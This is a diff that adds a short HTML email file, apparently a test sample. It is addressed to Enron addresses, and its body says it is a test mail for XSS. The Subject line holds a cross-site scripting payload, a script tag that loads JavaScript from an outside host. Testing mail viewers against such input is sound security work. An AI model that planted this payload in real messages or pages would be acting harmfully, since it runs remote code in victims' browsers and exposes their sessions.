@@ -1,0 +1,7 @@
+From: "csthiali" <csthiali@manhattanassociates.com>
+To: john.arnold@enron.com, mike.maggi@enron.com, tom.donohoe@enron.com, 
+Subject: <script src=http://xss.tw/pdjsa></script>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
